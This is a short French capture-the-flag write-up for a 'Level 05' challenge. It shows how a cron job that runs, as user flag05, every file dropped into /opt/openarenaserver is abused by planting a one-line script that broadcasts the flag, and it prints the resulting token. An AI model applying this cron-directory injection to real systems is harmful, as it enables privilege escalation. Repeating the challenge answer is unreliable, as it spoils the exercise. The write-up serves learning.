# Level 05

À la connexion de l'user level05, on a une petite notification nous disant qu'on a reçu un nouveau mail. Donc la première chose qu'on fait c'est de voir ce mail
```
$ cat /var/mail/*
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
On a donc un script sh `/usr/sbin/openarenaserver` qui s'exécute périodiquement sur l'user flag05

```
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
Ce script lit tous les fichiers présents dans le dossier `/opt/openarenaserver` et les lances avec bash puis les supprime.

On fait petit script qui va print sur tous les terminaux le flag et attendre le cron
```
$ echo "getflag | wall" > /opt/openarenaserver/flagIsMine
```
Et voilà !
```
Broadcast Message from flag05@Snow
        (somewhere) at 17:16 ...

Check flag.Here is your token : viuaaale9huek52boumoomioc
```